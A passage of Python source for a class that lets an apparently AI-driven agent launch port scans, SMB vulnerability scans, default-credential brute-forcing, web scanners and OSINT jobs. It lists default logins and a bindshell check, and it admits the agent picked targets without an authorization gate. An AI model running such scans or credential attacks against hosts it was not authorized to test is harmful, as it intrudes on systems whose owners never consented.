                del cls._registry[session_id]
                logger.info(f"[SessionScanTracker] Cleaned up session {session_id}")


# Global tracker instance
scan_tracker = SessionScanTracker


class ScanTools:
    """
    Tools for agents to interact with scanning services
    """

    def __init__(self, proxy: str = None):
        self.api_key = os.environ.get("API_KEY", "changeme")
        self.rag_api_url = os.environ.get("RAG_API_URL", "https://rag-api:8000")
        self.web_scanner_url = os.environ.get("WEB_SCANNER_URL", "https://web-scanner:8010")
        self.nuclei_url = os.environ.get("NUCLEI_URL", "https://nuclei-runner:8011")
        self.nmap_url = os.environ.get("NMAP_URL", "https://nmap_scanner:8012")
        self.playwright_url = os.environ.get("PLAYWRIGHT_URL", "https://playwright-scanner:8014")
        self.scan_recommender_url = os.environ.get("SCAN_RECOMMENDER_URL", "https://scan-recommender:8013")
        self.pd_runner_url = os.environ.get("PD_RUNNER_URL", "https://pd-runner:8023")
        self.osint_runner_url = os.environ.get("OSINT_RUNNER_URL", "https://osint-runner:8024")
        self.brutus_runner_url = os.environ.get("BRUTUS_RUNNER_URL", "https://brutus-runner:8025")

        self.proxy = proxy  # SOCKS proxy URL (e.g. "socks5://node-manager:10001")
        self.headers = {"x-api-key": self.api_key}
        # Use connection pooling to reduce overhead
        self.client = httpx.Client(
            timeout=300.0,
            verify=False,
            limits=httpx.Limits(
                max_keepalive_connections=10,
                max_connections=20,
                keepalive_expiry=30.0
            ),
            http2=True  # Enable HTTP/2 for better performance
        )

        logger.info("ScanTools initialized with:")
        logger.info(f"  RAG API: {self.rag_api_url}")
        logger.info(f"  Nmap: {self.nmap_url}")
        logger.info(f"  Web Scanner: {self.web_scanner_url}")
        logger.info(f"  Nuclei: {self.nuclei_url}")
        logger.info(f"  Playwright: {self.playwright_url}")
        logger.info(f"  Scan Recommender: {self.scan_recommender_url}")
        logger.info(f"  PD Runner: {self.pd_runner_url}")
        logger.info(f"  OSINT Runner: {self.osint_runner_url}")
        logger.info(f"  Brutus Runner: {self.brutus_runner_url}")
        logger.info(f"  Proxy: {self.proxy or 'none (direct)'}")
        logger.info(f"  Debug mode: {DEBUG_MODE}")

    def _inject_proxy(self, payload: dict) -> dict:
        """Inject SOCKS proxy into scan payload if configured."""
        if self.proxy:
            payload["proxy"] = self.proxy
        return payload

    def _log_request(self, method: str, url: str, **kwargs):
        """Log HTTP request details"""
        logger.debug(f"→ {method} {url}")
        if 'json' in kwargs and DEBUG_MODE:
            logger.debug(f"  Request body: {json.dumps(kwargs['json'], indent=2)}")
        if 'params' in kwargs and DEBUG_MODE:
            logger.debug(f"  Query params: {kwargs['params']}")

    def _log_response(self, response: httpx.Response, error: Optional[Exception] = None):
        """Log HTTP response details"""
        if error:
            logger.error(f"✗ Request failed: {type(error).__name__}: {error}")
            logger.error(f"  Traceback: {traceback.format_exc()}")
            return

        status_emoji = "✓" if response.status_code < 400 else "✗"
        logger.info(f"{status_emoji} {response.status_code} {response.request.method} {response.request.url}")

        if DEBUG_MODE or response.status_code >= 400:
            logger.debug(f"  Response headers: {dict(response.headers)}")
            try:
                # Try to parse as JSON for pretty printing
                response_json = response.json()
                logger.debug(f"  Response body: {json.dumps(response_json, indent=2)[:1000]}")
            except Exception:
                # Not JSON or parse error
                response_text = response.text[:1000]
                logger.debug(f"  Response body: {response_text}")

    def _make_request(self, method: str, url: str, operation: str, **kwargs) -> Dict:
        """
        Make HTTP request with comprehensive error handling and logging

        Args:
            method: HTTP method (GET, POST, etc.)
            url: Full URL
            operation: Description of operation for error messages
            **kwargs: Additional arguments for httpx request

        Returns:
            Dictionary with response data or error information
        """
        request_id = f"{operation}_{int(time.time()*1000)}"
        logger.info(f"[{request_id}] Starting: {operation}")

        # Auto-inject proxy into POST JSON payloads for scan requests
        if self.proxy and method.upper() == "POST" and "json" in kwargs and isinstance(kwargs["json"], dict):
            if "proxy" not in kwargs["json"]:
                kwargs["json"]["proxy"] = self.proxy
                logger.info(f"[{request_id}] Injected proxy: {self.proxy}")

        self._log_request(method, url, **kwargs)

        try:
            response = self.client.request(method, url, **kwargs)
            self._log_response(response)

            # Check for HTTP errors
            if response.status_code >= 400:
                error_detail = {
                    "error": f"HTTP {response.status_code}",
                    "operation": operation,
                    "url": url,
                    "status_code": response.status_code,
                    "request_id": request_id
                }

                # Try to get error details from response
                try:
                    error_body = response.json()
                    error_detail["detail"] = error_body
                except Exception:
                    error_detail["detail"] = response.text[:500]

                logger.error(f"[{request_id}] Failed: {json.dumps(error_detail, indent=2)}")
                return error_detail

            # Try to parse JSON response
            try:
                result = response.json()
                logger.info(f"[{request_id}] Success: {operation}")
                return result
            except json.JSONDecodeError as e:
                error_detail = {
                    "error": "JSON parsing failed",
                    "operation": operation,
                    "url": url,
                    "json_error": str(e),
                    "response_text": response.text[:500],
                    "status_code": response.status_code,
                    "request_id": request_id
                }
                logger.error(f"[{request_id}] JSON parse error: {json.dumps(error_detail, indent=2)}")
                return error_detail

        except httpx.TimeoutException as e:
            error_detail = {
                "error": "Request timeout",
                "operation": operation,
                "url": url,
                "timeout": "300s",
                "request_id": request_id
            }
            logger.error(f"[{request_id}] Timeout: {json.dumps(error_detail, indent=2)}")
            self._log_response(None, e)
            return error_detail

        except httpx.ConnectError as e:
            error_detail = {
                "error": "Connection failed",
                "operation": operation,
                "url": url,
                "detail": str(e),
                "request_id": request_id,
                "hint": "Check if the service is running and network is accessible"
            }
            logger.error(f"[{request_id}] Connection error: {json.dumps(error_detail, indent=2)}")
            self._log_response(None, e)
            return error_detail

        except Exception as e:
            error_detail = {
                "error": f"{type(e).__name__}: {str(e)}",
                "operation": operation,
                "url": url,
                "request_id": request_id,
                "traceback": traceback.format_exc()
            }
            logger.error(f"[{request_id}] Unexpected error: {json.dumps(error_detail, indent=2)}")
            self._log_response(None, e)
            return error_detail

    def query_open_ports(self, limit: int = 100, ip: str = None) -> Dict:
        """
        Query open ports from database

        Args:
            limit: Maximum number of results
            ip: Optional server-side host filter. IMPORTANT — pass this when you
                want one host's ports: /ports/open returns a flat, LIMIT-capped
                page across ALL hosts, so a lab/internal IP can fall outside the
                page and a client-side filter then sees zero. The endpoint's
                `ip` filter is `host(a.ip)=` so it is CIDR-safe server-side.

        Returns:
            Dictionary with open ports data
        """
        params = {"limit": limit}
        if ip:
            params["ip"] = ip
        return self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/ports/open",
            operation=f"Query open ports (limit={limit}{', ip='+ip if ip else ''})",
            headers=self.headers,
            params=params
        )

    def query_assets(self, limit: int = 100) -> Dict:
        """
        Query assets from database

        Args:
            limit: Maximum number of results

        Returns:
            Dictionary with assets data
        """
        return self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/assets",
            operation=f"Query assets (limit={limit})",
            headers=self.headers,
            params={"limit": limit}
        )

    def query_vulnerabilities(
        self,
        severity: Optional[str] = None,
        limit: int = 100
    ) -> Dict:
        """
        Query vulnerabilities from database

        Args:
            severity: Filter by severity (info, low, medium, high, critical)
            limit: Maximum number of results

        Returns:
            Dictionary with vulnerability data
        """
        params = {"limit": limit}
        if severity:
            params["severity"] = severity

        operation = f"Query vulnerabilities (limit={limit}"
        if severity:
            operation += f", severity={severity}"
        operation += ")"

        return self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/vulns",
            operation=operation,
            headers=self.headers,
            params=params
        )

    def start_masscan_only(
        self,
        targets: List[str],
        ports: str = "1-65535",
        rate: int = 1000,
        interface: str = "eth0"
    ) -> Dict:
        """
        Start a fast Masscan-only port scan (no service detection)

        Args:
            targets: List of IP addresses or CIDRs (e.g., ["192.168.1.0/24", "10.0.0.1"])
            ports: Port range. Defaults to nmap's top-1000. Do NOT pass "1-1000" —
                   that is the first 1000 port NUMBERS, not the 1000 most commonly
                   open ports, and it will be upgraded to the top-1000 anyway.
            rate: Scan rate in packets per second (default 1000)
            interface: Network interface to use (default "eth0")

        Returns:
            Dictionary with scan job information
        """
        # Same upgrade start_full_scan applies. This is the choke point every
        # wrapper funnels through, so an LLM-passed sequential low range is
        # caught here regardless of which tool it called.
        ports = _upgrade_sequential_quick_ports(ports)
        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/masscan-only",
            operation=f"Masscan of {', '.join(targets[:3])}{'...' if len(targets) > 3 else ''}",
            headers={"content-type": "application/json"},
            json={
                "targets": targets,
                "ports": ports,
                "rate": rate,
                "interface": interface
            }
        )

    def start_nmap_scan(
        self,
        ip_address: str,
        ports: str = DEFAULT_QUICK_PORTS,
        service_detection: bool = True,
        version_intensity: int = 9,
        enable_scripts: bool = True,
        interface: str = "eth0"
    ) -> Dict:
        """
        Start an Nmap scan using Masscan followed by Nmap enrichment

        Args:
            ip_address: Target IP address or CIDR (e.g., "192.168.1.1" or "10.0.0.0/24")
            ports: Port range. Defaults to nmap's top-1000. Do NOT pass "1-1000" —
                   that is the first 1000 port NUMBERS, not the 1000 most commonly
                   open ports, and it will be upgraded to the top-1000 anyway.
            service_detection: Enable service version detection (-sV flag)
            version_intensity: Service detection intensity 0-9 (9=aggressive)
            enable_scripts: Enable NSE scripts for banner grabbing and vulnerability detection
            interface: Network interface to use (default "eth0")

        Returns:
            Dictionary with scan job information
        """
        # Same upgrade start_full_scan applies. This is the choke point every
        # wrapper funnels through, so an LLM-passed sequential low range is
        # caught here regardless of which tool it called.
        ports = _upgrade_sequential_quick_ports(ports)
        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/masscan-then-nmap",
            operation=f"Nmap scan of {ip_address}",
            headers={"content-type": "application/json"},
            json={
                "targets": [ip_address],
                "ports": ports,
                "rate": 1000,
                "interface": interface,
                "service_detection": service_detection,
                "version_intensity": version_intensity,
                "scripts": "banner,http-title,ssl-cert,ssl-enum-ciphers,ssh2-enum-algos,vulscan/vulscan.nse,vulners,vuln" if enable_scripts else None
            }
        )

    def start_udp_scan(
        self,
        targets: List[str],
        ports: str = "53,67,68,69,123,137,138,161,162,500,514,520,1434,1900,4500,5353",
        top_ports: int = None,
        rate_limit: str = "100"
    ) -> Dict:
        """
        Start an Nmap UDP scan

        UDP scans are slower than TCP scans but important for discovering
        services like DNS, SNMP, NTP, and other UDP-based protocols.

        Args:
            targets: List of IP addresses or CIDRs to scan
            ports: UDP ports to scan (default: common UDP ports)
            top_ports: Scan top N UDP ports instead of specific ports
            rate_limit: Packets per second (default: 100, UDP needs slower rate)

        Returns:
            Dictionary with scan job information
        """
        payload = {
            "targets": targets,
            "ports": ports,
            "rate_limit": rate_limit
        }
        if top_ports:
            payload["top_ports"] = top_ports

        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/nmap-udp",
            operation=f"UDP scan of {', '.join(targets[:3])}{'...' if len(targets) > 3 else ''}",
            headers={"content-type": "application/json"},
            json=payload
        )

    def start_full_scan(
        self,
        targets: List[str],
        quick_ports: str = DEFAULT_QUICK_PORTS,
        full_ports: str = DEFAULT_DEEP_SCAN_PORTS,
        rate: int = 1000,
        interface: str = "eth0",
        run_smb_vuln_scan: bool = False,
        run_credential_check: bool = False
    ) -> Dict:
        """
        Start a comprehensive full port scan with parallel phases.

        This runs a phased scanning approach for maximum coverage:
        - Phase 1: Quick masscan over nmap's top-1000 (frequency-ranked)
        - Phase 2: PARALLEL - Nmap on Phase 1 ports + Masscan over 1-65535
        - Phase 3: Nmap service detection on Phase 2 ports

        Phase 2 sweeps the full range rather than 1001-65535: the quick pass is
        frequency-ranked and its members are scattered across the whole range, so
        "everything above 1000" is no longer its complement and would leave the
        low ports outside the top-1000 unscanned by either phase.

        Discovers high-value ports often missed by limited scans:
        - 1099 (Java RMI), 1524 (Bindshell), 3306 (MySQL)
        - 3632 (DISTCC), 5432 (PostgreSQL), 5900 (VNC)
        - 6667 (IRC), 8180 (Tomcat)

        Args:
            targets: List of IP addresses or CIDRs
            quick_ports: Ports for quick initial scan (default: nmap top-1000)
            full_ports: Ports for the follow-up sweep (default "1-65535")
            rate: Masscan rate in packets per second
            interface: Network interface to use
            run_smb_vuln_scan: Run SMB vulnerability scan if 139/445 found
            run_credential_check: Run credential checking on auth services

        Returns:
            Dictionary with job information and phases
        """
        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/full-scan",
            operation=f"Full scan of {', '.join(targets[:3])}{'...' if len(targets) > 3 else ''}",
            headers={"content-type": "application/json"},
            json={
                "targets": targets,
                "quick_ports": quick_ports,
                "full_ports": full_ports,
                "rate": rate,
                "interface": interface,
                "run_smb_vuln_scan": run_smb_vuln_scan,
                "run_credential_check": run_credential_check
            }
        )

    def start_smb_vuln_scan(
        self,
        targets: List[str],
        ports: str = "139,445",
        rate: int = 1000
    ) -> Dict:
        """
        Start an SMB-specific vulnerability scan.

        Runs nmap with SMB vulnerability scripts to detect:
        - CVE-2007-2447 (Samba usermap_script) - CRITICAL RCE
        - CVE-2017-7494 (SambaCry)
        - MS17-010 (EternalBlue)
        - MS08-067 (NetAPI)

        Args:
            targets: List of IP addresses to scan
            ports: SMB ports to scan (default "139,445")
            rate: Scan rate

        Returns:
            Dictionary with job information
        """
        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/smb-vuln-scan",
            operation=f"SMB vulnerability scan of {', '.join(targets[:3])}",
            headers={"content-type": "application/json"},
            json={
                "targets": targets,
                "ports": ports,
                "rate": rate
            }
        )

    def start_credential_check(
        self,
        targets: List[str],
        ports: Optional[List[int]] = None,
        services: Optional[List[str]] = None,
        method: str = "hydra"
    ) -> Dict:
        """
        Start credential testing for default/weak passwords.

        Tests common default credentials for services like:
        - SSH: msfadmin:msfadmin, root:root
        - FTP: anonymous, ftp:ftp
        - MySQL: root with empty password
        - PostgreSQL: postgres:postgres
        - VNC: common passwords
        - Tomcat: tomcat:tomcat

        Also checks for bindshell on port 1524 (instant root).

        Args:
            targets: List of IP addresses to check
            ports: Specific ports to check (auto-detects service)
            services: Specific services to check (ssh, ftp, mysql, etc.)
            method: Testing method ('hydra' or 'nmap')

        Returns:
            Dictionary with job information
        """
        payload = {
            "targets": targets,
            "method": method
        }
        if ports:
            payload["ports"] = ports
        if services:
            payload["services"] = services

        return self._make_request(
            method="POST",
            url=f"{self.nmap_url}/jobs/credential-check",
            operation=f"Credential check of {', '.join(targets[:3])}",
            headers={"content-type": "application/json"},
            json=payload
        )

    def start_web_scan(
        self,
        do_gobuster: bool = True,
        do_zap: bool = True,
        limit: int = 25
    ) -> Dict:
        """
        Start a web scan (Gobuster + ZAP)

        Args:
            do_gobuster: Run Gobuster directory enumeration
            do_zap: Run ZAP proxy scanning
            limit: Maximum number of targets to scan

        Returns:
            Dictionary with job information
        """
        return self._make_request(
            method="POST",
            url=f"{self.web_scanner_url}/jobs/web-scan",
            operation=f"Web scan (gobuster={do_gobuster}, zap={do_zap}, limit={limit})",
            headers={"content-type": "application/json"},
            json={
                "do_gobuster": do_gobuster,
                "do_zap": do_zap,
                "limit": limit
            }
        )

    def start_pipeline_scan(
        self,
        target_url: str,
        wordlist: Optional[str] = None,
        max_paths_to_visit: int = 50,
        skip_gobuster: bool = False,
        skip_playwright: bool = False,
        skip_zap: bool = False,
        skip_nuclei: bool = False,
        skip_katana: bool = False
    ) -> Dict:
        """
        Start a sequential web scan pipeline: Gobuster → Nikto → Playwright → Katana → ZAP → Nuclei

        This runs a comprehensive web scan where each stage feeds discovered
        data to subsequent stages:
        1. Gobuster - Discovers paths/directories
        2. Nikto - Web server security scanning (fast, no URL dependency)
        3. Playwright - Visits discovered paths with browser, extracts forms/cookies
        4. Katana - JS-aware crawling for endpoints, forms, JS URLs
        5. ZAP - Runs vulnerability scan with all discovered URLs pre-seeded
        6. Nuclei - Checks for CVEs and misconfigurations on all paths

        Args:
            target_url: Target URL (e.g., "http://192.168.1.150")
            wordlist: Gobuster wordlist (small, medium, big, common, etc.)
            max_paths_to_visit: Max paths for Playwright to visit (default: 50)
            skip_gobuster: Skip Gobuster stage
            skip_playwright: Skip Playwright stage
            skip_zap: Skip ZAP stage
            skip_nuclei: Skip Nuclei stage
            skip_katana: Skip Katana stage

        Returns:
            Dictionary with job information including job_id and stages
        """
        return self._make_request(
            method="POST",
            url=f"{self.web_scanner_url}/jobs/pipeline-scan",
            operation=f"Pipeline scan of {target_url}",
            headers={"content-type": "application/json"},
            json={
                "target_url": target_url,
                "wordlist": wordlist,
                "max_paths_to_visit": max_paths_to_visit,
                "skip_gobuster": skip_gobuster,
                "skip_playwright": skip_playwright,
                "skip_zap": skip_zap,
                "skip_nuclei": skip_nuclei,
                "skip_katana": skip_katana
            }
        )

    def start_nuclei_scan(
        self,
        limit: int = 25,
        severity: str = "medium,high,critical",
        all_ports: bool = True
    ) -> Dict:
        """
        Start a Nuclei vulnerability scan

        Args:
            limit: Maximum number of targets
            severity: Comma-separated severity levels
            all_ports: Scan ALL open ports (True) or just web ports (False)

        Returns:
            Dictionary with job information
        """
        return self._make_request(
            method="POST",
            url=f"{self.nuclei_url}/jobs/nuclei-scan",
            operation=f"Nuclei scan (limit={limit}, severity={severity}, all_ports={all_ports})",
            headers={"content-type": "application/json"},
            json={
                "limit": limit,
                "severity": severity,
                "all_ports": all_ports
            }
        )

    def start_playwright_scan(
        self,
        url: str,
        use_zap_proxy: bool = True,
        capture_screenshots: bool = True,
        run_security_checks: bool = True,
        zap_spider: bool = False,
        zap_active_scan: bool = False
    ) -> Dict:
        """
        Start a Playwright browser security scan

        Args:
            url: Target URL
            use_zap_proxy: Route traffic through ZAP
            capture_screenshots: Capture page screenshots
            run_security_checks: Run security checks
            zap_spider: Run ZAP spider
            zap_active_scan: Run ZAP active scan

        Returns:
            Dictionary with scan information
        """
        return self._make_request(
            method="POST",
            url=f"{self.playwright_url}/scan",
            operation=f"Playwright scan of {url}",
            headers={"content-type": "application/json"},
            json={
                "url": url,
                "use_zap_proxy": use_zap_proxy,
                "capture_screenshots": capture_screenshots,
                "run_security_checks": run_security_checks,
                "zap_spider": zap_spider,
                "zap_active_scan": zap_active_scan
            }
        )

    def get_playwright_scan_status(self, scan_id: str) -> Dict:
        """
        Get Playwright scan status

        Args:
            scan_id: Scan UUID

        Returns:
            Dictionary with scan status and results
        """
        return self._make_request(
            method="GET",
            url=f"{self.playwright_url}/scan/{scan_id}",
            operation=f"Get Playwright scan status ({scan_id})",
            headers={"content-type": "application/json"}
        )

    def get_playwright_findings(
        self,
        scan_id: str,
        severity: Optional[str] = None
    ) -> Dict:
        """
        Get Playwright scan findings

        Args:
            scan_id: Scan UUID
            severity: Filter by severity

        Returns:
            Dictionary with findings
        """
        params = {}
        if severity:
            params["severity"] = severity

        operation = f"Get Playwright findings ({scan_id}"
        if severity:
            operation += f", severity={severity}"
        operation += ")"

        return self._make_request(
            method="GET",
            url=f"{self.playwright_url}/scan/{scan_id}/findings",
            operation=operation,
            headers={"content-type": "application/json"},
            params=params
        )

    def query_exploitdb(self, query: str, top_k: int = 5) -> Dict:
        """
        Query ExploitDB via RAG API

        Args:
            query: Search query
            top_k: Number of results to return

        Returns:
            Dictionary with exploit information
        """
        return self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/ask",
            operation=f"Query ExploitDB: '{query[:50]}...' (top_k={top_k})",
            params={"q": query, "top_k": top_k}
        )

    def get_scan_recommendations(
        self,
        context: str,
        scan_results: Optional[Dict] = None
    ) -> Dict:
        """
        Get AI-powered scan recommendations

        Args:
            context: Description of target or current situation
            scan_results: Optional current scan results

        Returns:
            Dictionary with recommendations
        """
        payload = {"context": context}
        if scan_results:
            payload["scan_results"] = scan_results

        # Use /rag/ask endpoint with GET method and 'q' parameter
        try:
            return self._make_request(
                method="GET",
                url=f"{self.scan_recommender_url}/rag/ask",
                operation=f"Get scan recommendations: '{context[:50]}...'",
                params={"q": context}
            )
        except Exception as e:
            # Fallback: return a simple recommendation if RAG service is unavailable
            logger.warning(f"RAG service unavailable, returning fallback recommendation: {e}")
            return {
                "recommendation": f"Run comprehensive port scan on target. Context: {context}",
                "suggested_tools": ["start_nmap_scan", "start_web_scan"],
                "priority": "high",
                "fallback": True
            }

    def get_web_findings(self, limit: int = 100) -> Dict:
        """
        Get web findings from database.

        There is no `/web_findings` endpoint (it 404s); the unified
        `/findings/search` is the source of truth and it spans the web tools via
        the `source` filter (zap / gobuster / playwright).

        Args:
            limit: Maximum number of results

        Returns:
            Dictionary with web findings
        """
        resp = self._make_request(
            method="GET",
            url=f"{self.rag_api_url}/findings/search",
            operation=f"Query web findings (limit={limit})",
            headers=self.headers,
            params={"source": ["zap", "gobuster", "playwright"], "limit": limit},
        )
        # The unified endpoint returns `results`; alias it to `findings` so the
        # get_web_findings() wrapper's target/source post-filtering still applies.
        if isinstance(resp, dict) and "results" in resp and "findings" not in resp:
            resp["findings"] = resp["results"]
        return resp

    def check_system_status(self) -> Dict:
        """
        Check the availability and status of all scan tools and services.
        Returns a comprehensive status report.

        Returns:
            Dict with status of all services: {
                "overall_status": "healthy" | "degraded" | "unhealthy",
                "services": {...},
                "summary": "..."
            }
        """
        logger.info("Checking system status...")
        status_report = {
            "overall_status": "healthy",
            "services": {},
            "timestamp": time.time(),
            "issues": []
        }

        services_to_check = [
            ("nmap_scanner", f"{self.nmap_url}/health", "Nmap & Masscan Scanner"),
            ("rag_api", f"{self.rag_api_url}/health", "RAG API & Database"),
            ("web_scanner", f"{self.web_scanner_url}/health", "Web Scanner (Gobuster/ZAP)"),
            ("nuclei", f"{self.nuclei_url}/health", "Nuclei Scanner"),
            ("playwright", f"{self.playwright_url}/health", "Playwright Scanner"),
            ("scan_recommender", f"{self.scan_recommender_url}/health", "Scan Recommender"),
        ]

        healthy_count = 0
        total_count = len(services_to_check)

        for service_name, health_url, display_name in services_to_check:
            try:
                response = self.client.get(health_url, timeout=5.0)
                is_healthy = response.status_code == 200

                service_status = {
                    "name": display_name,
                    "status": "healthy" if is_healthy else "unhealthy",
                    "url": health_url,
                    "response_code": response.status_code,
                    "details": None
                }

                if is_healthy:
                    healthy_count += 1
                    try:
                        service_status["details"] = response.json()
                    except Exception:
                        pass
                else:
                    status_report["issues"].append(f"{display_name}: HTTP {response.status_code}")
                    logger.warning(f"{display_name} unhealthy: HTTP {response.status_code}")

                status_report["services"][service_name] = service_status

            except Exception as e:
                status_report["services"][service_name] = {
                    "name": display_name,
                    "status": "unreachable",
                    "url": health_url,
                    "error": str(e)
                }
                status_report["issues"].append(f"{display_name}: {type(e).__name__}: {str(e)}")
                logger.error(f"{display_name} check failed: {e}")

        # Determine overall status
        if healthy_count == total_count:
            status_report["overall_status"] = "healthy"
            status_report["summary"] = f"All {total_count} services are healthy and ready"
        elif healthy_count > 0:
            status_report["overall_status"] = "degraded"
            status_report["summary"] = f"{healthy_count}/{total_count} services healthy, {total_count - healthy_count} services degraded"
        else:
            status_report["overall_status"] = "unhealthy"
            status_report["summary"] = "All services are unavailable"

        logger.info(f"System status: {status_report['overall_status']} - {status_report['summary']}")
        return status_report

    def get_tool_recommendations(
        self,
        service: str = None,
        port: int = None,
        include_msf: bool = True,
        include_nuclei: bool = True,
        include_rag: bool = True
    ) -> Dict:
        """
        Get tool recommendations for testing a discovered service.

        Uses the tool knowledge base to return recommended tools, Metasploit modules,
        Nuclei tags, and common vulnerabilities for a given service or port.

        Args:
            service: Service name (e.g., 'ssh', 'http', 'smb', 'mysql')
            port: Port number (used to infer service if service not provided)
            include_msf: Include Metasploit module recommendations
            include_nuclei: Include Nuclei scan tags
            include_rag: Include RAG context from methodology playbooks

        Returns:
            Dictionary containing:
                - service: The identified service name
                - description: Service description
                - tools: List of recommended tools with commands
                - metasploit: List of Metasploit modules
                - nuclei_tags: Tags to use with Nuclei scanner
                - common_vulns: Common vulnerabilities to check
                - rag_context: Methodology context from RAG (if available)

        Example:
            >>> tools = scan_tools.get_tool_recommendations(service="ssh", port=22)
            >>> print(tools["tools"][0]["command"])
            'nmap -sV -sC -p 22 {target}'
        """
        params = {
            "include_msf": include_msf,
            "include_nuclei": include_nuclei,
            "include_rag": include_rag
        }

        if service:
            params["service"] = service
        if port:
            params["port"] = port

        return self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/recommend",
            operation=f"Get tool recommendations for service={service} port={port}",
            params=params
        )

    def search_tools(self, query: str, tool_type: str = None) -> Dict:
        """
        Search for tools by name or purpose across all services.

        Args:
            query: Search query (e.g., 'brute force', 'hydra', 'enumeration')
            tool_type: Optional filter - 'tools' or 'metasploit'

        Returns:
            Dictionary with matching tools and their service context
        """
        params = {"q": query}
        if tool_type:
            params["tool_type"] = tool_type

        return self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/search",
            operation=f"Search tools: '{query}'",
            params=params
        )

    def list_known_services(self) -> Dict:
        """
        Get list of all known services in the tool knowledge base.

        Returns:
            Dictionary with list of service names and port mappings
        """
        return self._make_request(
            method="GET",
            url=f"{self.scan_recommender_url}/rag/tools/services",
            operation="List known services"
        )

    # ===============================
    # PD Runner Methods
    # ===============================

    def start_subfinder(self, domains: List[str], sources: str = None) -> Dict:
        """Start passive subdomain enumeration with subfinder."""
        payload = {"domains": domains}
        if sources:
            payload["sources"] = sources
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/subfinder",
            operation=f"Subfinder on {', '.join(domains[:3])}",
            headers={"content-type": "application/json"}, json=payload,
        )

    def start_httpx_probe(self, targets: Any = "from_db", ports: str = None, tech_detect: bool = True) -> Dict:
        """Start HTTP probing and tech detection with httpx."""
        payload = {"targets": targets, "tech_detect": tech_detect}
        if ports:
            payload["ports"] = ports
        return self._make_request(
            method="POST", url=f"{self.pd_runner_url}/jobs/httpx",
            operation=f"Httpx probe ({'from_db' if targets == 'from_db' else str(len(targets)) + ' targets'})",
            headers={"content-type": "application/json"}, json=payload,
        )

    def start_naabu(self, targets: List[str], ports: str = DEFAULT_QUICK_PORTS, rate: int = 1000) -> Dict:
        """Start fast port scanning with naabu. Defaults to nmap's top-1000."""
        # Same upgrade start_full_scan applies. This is the choke point every
        # wrapper funnels through, so an LLM-passed sequential low range is
        # caught here regardless of which tool it called.
        ports = _upgrade_sequential_quick_ports(ports)
        return self._make_request(
            method="POST", url=f"{self.pd_runner_url}/jobs/naabu",
            operation=f"Naabu scan of {', '.join(targets[:3])}",
            headers={"content-type": "application/json"},
            json={"targets": targets, "ports": ports, "rate": rate},
        )

    def start_katana(self, targets: Any = "from_db", depth: int = 3, js_crawl: bool = True) -> Dict:
        """Start web crawling with katana."""
        return self._make_request(
            method="POST", url=f"{self.pd_runner_url}/jobs/katana",
            operation=f"Katana crawl ({'from_db' if targets == 'from_db' else str(len(targets)) + ' targets'})",
            headers={"content-type": "application/json"},
            json={"targets": targets, "depth": depth, "js_crawl": js_crawl},
        )

    def start_brutus(self, targets: List[str], protocols: List[str],
                     usernames: List[str] = None, passwords: List[str] = None) -> Dict:
        """Start multi-protocol credential testing with brutus."""
        payload = {"targets": targets, "protocols": protocols}
        if usernames:
            payload["usernames"] = usernames
        if passwords:
            payload["passwords"] = passwords
        return self._make_request(
            method="POST", url=f"{self.brutus_runner_url}/jobs/brutus",
            operation=f"Brutus cred test on {', '.join(targets[:3])}",
            headers={"content-type": "application/json"}, json=payload,
        )

    def get_pd_job_status(self, job_id: str) -> Dict:
        """Get status of a PD Runner job."""
        return self._make_request(
            method="GET", url=f"{self.pd_runner_url}/jobs/{job_id}",
            operation=f"PD Runner job status ({job_id[:8]})",
        )

    # ===============================
    # OSINT Runner Methods
    # ===============================

    def start_dnsx(self, domains: List[str], record_types: str = "A,AAAA,CNAME,MX,NS") -> Dict:
        """Start DNS resolution and enumeration with dnsx."""
        payload = {"domains": domains, "record_types": record_types}
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/dnsx",
            operation=f"DNSx on {', '.join(domains[:3])}",
            headers={"content-type": "application/json"}, json=payload,
        )

    def start_asnmap(self, targets: List[str]) -> Dict:
        """Start ASN to CIDR mapping with asnmap."""
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/asnmap",
            operation=f"ASNmap on {', '.join(targets[:3])}",
            headers={"content-type": "application/json"}, json={"targets": targets},
        )

    def start_uncover(self, query: str, engine: str = "shodan", limit: int = 100) -> Dict:
        """Start Shodan/Censys/Fofa query with uncover."""
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/uncover",
            operation=f"Uncover query: {query[:40]}",
            headers={"content-type": "application/json"},
            json={"query": query, "engine": engine, "limit": limit},
        )

    def start_cloudlist(self, provider: str) -> Dict:
        """Start cloud provider IP enumeration with cloudlist."""
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/cloudlist",
            operation=f"Cloudlist for {provider}",
            headers={"content-type": "application/json"}, json={"provider": provider},
        )

    def start_subdomain_takeover(self, subdomains: List[str], timeout: int = 30) -> Dict:
        """Detect subdomain takeover vulnerabilities."""
        return self._make_request(
            method="POST", url=f"{self.osint_runner_url}/jobs/subdomain-takeover",
            operation=f"Subdomain takeover scan on {len(subdomains)} subdomains",
            headers={"content-type": "application/json"},
            json={"subdomains": subdomains, "timeout": timeout},
        )

    def get_osint_job_status(self, job_id: str) -> Dict:
        """Get status of an OSINT Runner job."""
        return self._make_request(
            method="GET", url=f"{self.osint_runner_url}/jobs/{job_id}",
            operation=f"OSINT Runner job status ({job_id[:8]})",
        )

    def get_brutus_job_status(self, job_id: str) -> Dict:
        """Get status of a Brutus Runner job."""
        return self._make_request(
            method="GET", url=f"{self.brutus_runner_url}/jobs/{job_id}",
            operation=f"Brutus Runner job status ({job_id[:8]})",
        )

    def close(self):
        """Close HTTP client"""
        self.client.close()


# ===============================
# Async Scan Tools (non-blocking)
# ===============================

# ── Authorization gate ──────────────────────────────────────────────────────
# The agent decides for itself which hosts to scan, so this module needs the
# gate more than most — and it had none. It could not have one until now:
